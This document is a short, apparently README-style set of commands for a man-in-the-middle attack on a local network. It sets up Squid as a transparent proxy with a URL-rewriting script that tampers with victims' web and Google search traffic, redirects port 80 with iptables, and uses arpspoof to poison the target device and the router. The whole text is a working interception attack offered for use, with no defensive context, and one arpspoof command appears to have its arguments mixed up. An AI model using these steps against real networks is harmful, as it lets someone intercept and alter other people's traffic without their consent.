1. `apt-get install squid3 -y` : Squid3 is a proxy tool
2. `apt-get install apache2 -y` : Apache is server framework
3. `apt-get install -y imagemagick ghostscript jp2a`
4. Download scripts from 'code.google.com'
    - googlesearch.pl : to add extra characters in google search (Or check file 'googleSearch*.png' in images)
5. Edit '/etc/squid3/squid.conf'
    - Search 'acl localnet src' : Uncomment the line with your network IP
    - Uncomment 'http_access allow localnet'
    - Uncomment 'http_port 3128' and add 'transparent' in the end : 'http_port 3128 transparent'
    - Add 'url_rewrite_program <path/to/scriptfile.pl>' at the end of config file. scriptfile is the one downloaded from code.google.com (or your own script)
6. `service squid3 restart` : restart squid service
7. `iptables -t nat -A PREROUTING -i en0 -p tcp --destination-port 80 -j REDIRECT --to-port 3128` : It will redirect all the traffic to port 3128
8. `echo 1 > /proc/sys/net/ipv4/ip_forward` : Enable IP forwarding
9. Create temp folder for scripts to run smoothly:
    - `mkdir /var/www/tmp`
    - `chmod 777 /var/www/tmp`
10. `service apache2 restart`
11. Spoof arp:
    - `arpspoof -i en0 -t 192.168.1.1  -r 192.168.1.121` : Spoof target device
    - On another terminal, run `arpspoof -i en0 -t 192.168.1.1  -r 192.168.1.1` : spoof target router to which, target device is connected
